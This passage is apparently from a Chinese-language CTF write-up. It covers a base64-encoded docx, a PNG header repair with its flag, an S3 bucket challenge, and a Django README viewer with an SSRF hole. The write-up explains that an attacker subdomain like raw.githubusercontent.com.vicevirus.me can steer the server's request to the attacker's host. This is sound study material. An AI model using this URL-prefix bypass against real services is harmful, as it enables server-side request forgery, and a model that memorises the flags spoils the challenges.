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&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> base64Decode(str)&#123;</span><br><span class="line">    <span class="built_in">return</span> atob(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var decodedStr = base64Decode(encodedStr);</span><br><span class="line">console.log(decodedStr)</span><br></pre></td></tr></table></figure>
<p>他最後有提到這串是b64的加密</p>
<p><img src="img/hackthonkor_5.png" alt="Untitled"></p>
<p>這邊看到PK開頭，是zip檔的標頭檔，下載成zip解開</p>
<p>在document.xml檔案中看到</p>
<p><img src="img/hackthonkor_6.png" alt="Untitled"></p>
<p><img src="img/hackthonkor_7.png" alt="Untitled"></p>
<hr>
<h3 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h3><p>png在winhex打開後發現不完整，所以需要填充一些字節進去</p>
<p><img src="img/hackthonkor_8.png" alt="Untitled"></p>
<p>儲存後打開文件 s1gnatur35_Are_v3ry_1mp0rtant_1n_th3_5tructur3_of_fil3s</p>
<p><img src="img/hackthonkor_9.png" alt="Untitled"></p>
<p><img src="img/hackthonkor_10.png" alt="Untitled"></p>
<hr>
<h3 id="Dog-Gallery"><a href="#Dog-Gallery" class="headerlink" title="Dog Gallery"></a><strong>Dog Gallery</strong></h3><p><img src="img/hackthonkor_11.png" alt="Untitled"></p>
<p>開啟網頁是一堆可愛的狗狗</p>
<p>針對圖片查看儲存位置，是<strong>S3 bucket的部分</strong></p>
<p><img src="img/hackthonkor_12.png" alt="Untitled"></p>
<p>開啟該網頁查看</p>
<p><img src="img/hackthonkor_13.png" alt="Untitled"></p>
<p><img src="img/hackthonkor_14.png" alt="Untitled"></p>
<hr>
<h3 id="GithubReadme"><a href="#GithubReadme" class="headerlink" title="GithubReadme"></a><strong>GithubReadme</strong></h3><blockquote>
<p>這題首先感謝我隊友的朋友在賽後無私的分享他的做法，我也是針對他的 writeup 進行研究，受益良多!!!</p>
</blockquote>
<p>這題允許閱讀git respository，按照慣例，去找網頁原始碼查看</p>
<p><img src="img/hackthonkor_15.png" alt="Untitled"></p>
<p>這邊可以注意到 <code>/api/view</code> 、 <code>/api/admin</code> 頁面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api.post(<span class="params"><span class="string">&quot;/view&quot;</span>, response=&#123;<span class="number">200</span>: <span class="built_in">str</span>, <span class="number">400</span>: Error&#125;</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">request, path: Path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ip = get_client_ip(request)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> ReqLog.objects.<span class="built_in">filter</span>(ip=ip, request_at__gt=timezone.now() - timedelta(seconds=<span class="number">10</span>)).exists():</span><br><span class="line">            <span class="keyword">return</span> <span class="number">400</span>, &#123;<span class="string">&#x27;msg&#x27;</span>: <span class="string">f&quot;so Fast.. - <span class="subst">&#123;ip&#125;</span>&quot;</span>&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ReqLog(ip=ip).save()</span><br><span class="line">        github = Github.objects.<span class="built_in">filter</span>(path=path)</span><br><span class="line">        <span class="keyword">if</span> github.exists():</span><br><span class="line">            <span class="keyword">return</span> github.first().readme</span><br><span class="line">        url = <span class="string">f&quot;&lt;https://raw.githubusercontent.com&gt;<span class="subst">&#123;path.path&#125;</span>/<span class="subst">&#123;path.branch_name&#125;</span>/README.md&quot;</span></span><br><span class="line">        URLValidator()(url)</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">400</span>, &#123;&#125;</span><br><span class="line">        readme = response.text</span><br><span class="line">        Github(</span><br><span class="line">            path=path,</span><br><span class="line">            readme=readme</span><br><span class="line">        ).save()</span><br><span class="line">        <span class="keyword">return</span> readme</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">400</span>, &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@api.get(<span class="params"><span class="string">&quot;/admin&quot;</span>, response=&#123;<span class="number">200</span>: <span class="built_in">dict</span>, <span class="number">401</span>: Error&#125;</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    client_ip, is_routable = get_client_ip(request)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_routable :</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;msg&#x27;</span>:os.environ.get(<span class="string">&#x27;FLAG&#x27;</span>)&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">401</span>, &#123;<span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ACCESS DENIED&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>注意到一個地方，路徑資訊是直接從使用者輸入中取得的，尤其是在拼接過程中沒有對使用者輸入進行嚴格的過濾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">f&quot;&lt;https://raw.githubusercontent.com&gt;<span class="subst">&#123;path.path&#125;</span>/<span class="subst">&#123;path.branch_name&#125;</span>/README.md&quot;</span></span><br><span class="line"></span><br><span class="line">URLValidator()(url)</span><br><span class="line">response = requests.get(url)</span><br></pre></td></tr></table></figure>
<p>攻擊者可以控制 <code>path.path</code> 和 <code>path.branch_name</code> 的值，因此可以建構惡意的URL，使伺服器在執行<code>requests.get()</code> 時存取攻擊者控制的任意位址</p>
<p><code>URLValidator</code> 是 Django 框架中用於驗證 URL 格式的驗證器之一。它用於確保傳入的字串符合 URL 的格式規範，例如是否以協定開頭（例如 http:// 或 <a target="_blank" rel="noopener" href="https://），是否包含有效的網域名稱等">https://），是否包含有效的網域名稱等</a></p>
<p>在這邊 <code>URLValidator()(url)</code>的作用是檢查建構的 URL 是否符合 URL 的格式要求</p>
<p>那如何有效的接上前面的domain並對其進行訪問?</p>
<p>這時就用到了<strong>DNS Record for Subdomain的技術</strong></p>
<p><img src="img/hackthonkor_16.png" alt="Untitled"></p>
<p>先來詳細說明這部分:</p>
<ul>
<li><p>子網域配置：</p>
<ul>
<li>在DNS記錄中配置子域名，將其指向您自己的伺服器IP位址。例如，在DNS設定中新增了一個A記錄，將子網域 <code>raw.githubusercontent.com.vicevirus.me</code> 指向了伺服器IP位址</li>
<li><p>範例DNS記錄：</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">raw.githubusercontent.com.vicevirus.<span class="keyword">me</span>. <span class="keyword">IN</span> A <span class="number">123.456</span>.<span class="number">789.10</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>當使用者嘗試存取 <code>raw.githubusercontent.com.vicevirus.me</code> 時，DNS將解析該子網域並傳回與您的伺服器關聯的IP位址</p>
</li>
</ul>
</li>
<li><p>權威DNS伺服器設定:</p>
<ul>
<li>權威DNS伺服器負責提供關於該網域的官方記錄，並傳回請求的解析結果</li>
<li>在DNS配置中，您需要指定您的網域名稱（vicevirus.me）所使用的權威 DNS 伺服器。DNS伺服器負責解析您的網域和子域名，因此必須正確配置</li>
<li><p>範例DNS伺服器設定：</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">vicevirus.<span class="keyword">me</span>. NS ns1.example.com.</span><br><span class="line">vicevirus.<span class="keyword">me</span>. NS ns2.example.com.</span><br></pre></td></tr></table></figure>
</li>
<li><p>這裡ns1.example.com和ns2.example.com是您的網域使用的權威DNS伺服器</p>
</li>
<li>假設您擁有網域example.com，並將其託管在某個託管服務提供者處。那麼，該託管服務提供者的DNS伺服器就是example.com網域的權威DNS伺服器</li>
<li>當其他DNS伺服器需要解析example.com網域下的子域名，例如 <code>www.example.com</code> ，它們會向該權威DNS伺服器發送查詢請求，以取得與 <code>www.example.com</code> 相關聯的IP位址</li>
</ul>
</li>
<li>網域解析流程:<ul>
<li>當使用者在瀏覽器中輸入raw.githubusercontent.com.vicevirus.me並按下Enter鍵時，作業系統會傳送解析請求至本機DNS伺服器</li>
<li>本機DNS伺服器首先會查詢根網域名稱伺服器，然後逐級查詢頂級網域名稱伺服器、權威網域名稱伺服器，最後取得到該子網域對應的IP位址</li>
<li>當本地DNS伺服器獲得IP位址後，將其傳回給使用者的電腦，使用者的瀏覽器將使用該IP位址發起HTTP請求</li>
</ul>
</li>
</ul>
<p>簡單來說就是 : 域名解析 &gt; 遞歸解析 &gt; 權威DNS解析 &gt; A記錄解析 &gt; 客戶端訪問 &gt; 服務器回應</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">+---------------------+             +-------------------------+            +------------------------+</span><br><span class="line">|     客戶端 (瀏覽器)  |             |  本地 DNS 服務器         |            |  您的伺服器             |</span><br><span class="line">+---------------------+             +-------------------------+            +------------------------+</span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         | 1. 訪問 raw.githubusercontent.com.vicevirus.me                         |</span></span><br><span class="line"><span class="code">         |----------------------------------------------------------------------&gt;|</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         | 2. 域名解析請求                    |                                   |</span></span><br><span class="line"><span class="code">         |----------------------------------------------------------------------&gt;|</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 3. 查找本地 DNS 緩存，未找到結果    |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 4. 發送 DNS 查詢請求               |</span></span><br><span class="line"><span class="code">         |                                   |----------------------------------&gt;|</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 5. 查找根域名服务器                |</span></span><br><span class="line"><span class="code">         |                                   |----------------------------------&gt;|</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 6. 查找 .me 顶级域名服务器          |</span></span><br><span class="line"><span class="code">         |                                   |----------------------------------&gt;|</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 7. 查找 vicevirus.me 的权威 DNS    |</span></span><br><span class="line"><span class="code">         |                                   |----------------------------------&gt;|</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 8. 查找 raw.githubusercontent.com.vicevirus.me 的IP地址    |</span></span><br><span class="line"><span class="code">         |                                   |----------------------------------------------------------&gt;|</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 9. 返回解析結果                    |</span></span><br><span class="line"><span class="code">         |                                   |</span></span><br><span class="line"><span class="code">         |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 10. 將 HTTP 請求發送至 raw.githubusercontent.com.vicevirus.me    |</span></span><br><span class="line"><span class="code">         |                                   |----------------------------------------------------------------&gt;|</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 11. Apache 伺服器處理請求          |</span></span><br><span class="line"><span class="code">         |                                   |------------------------------- &gt;  |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 12. 重定向 HTTP 請求到 HTTPS       |</span></span><br><span class="line"><span class="code">         |                                   |--------------------------------&gt;  |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   | 13. 返回 HTTPS 響應給客戶端        |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         |                                   |                                   |</span></span><br><span class="line"><span class="code">         | 14. 顯示網頁內容                   |                                   |</span></span><br><span class="line"><span class="code">         |</span></span><br><span class="line"><span class="code">+---------------------+             +-------------------------+            +------------------------+</span></span><br><span class="line"><span class="code">|     客戶端 (瀏覽器)  |             |  本地 DNS 服務器         |            |  您的伺服器             |</span></span><br><span class="line"><span class="code">+---------------------+             +-------------------------+            +------------------------+</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>
<p>所以這邊使用DNS到底要做什麼?</p>
<ul>
<li>設置A紀錄<ul>
<li>在你擁有的TLD域（vicevirus.me）的DNS管理介面上，新增一個A記錄子網域</li>
